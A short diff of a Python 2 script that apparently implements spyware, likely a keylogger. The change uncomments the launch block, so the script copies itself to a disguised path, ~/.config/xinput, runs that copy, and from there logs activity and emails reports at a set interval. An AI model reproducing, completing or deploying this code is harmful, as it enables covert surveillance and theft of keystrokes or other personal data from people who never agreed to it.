@@ -73,13 +73,12 @@ def send_mail_reports_every(interval):
 			pass
 
 
-print config.test
 current_file = os.path.realpath(__file__)
 destination_file = HOME_DIRECTORY + "/.config/xinput"
 
-# if current_file != destination_file:
-# 	initialize()
-# 	Popen(destination_file)
-# else:
-# 	start_logging(LOG_FILE)
-# 	send_mail_reports_every(SLEEP_INTERVAL)
+if current_file != destination_file:
+	initialize()
+	Popen(destination_file)
+else:
+	start_logging(LOG_FILE)
+	send_mail_reports_every(SLEEP_INTERVAL)
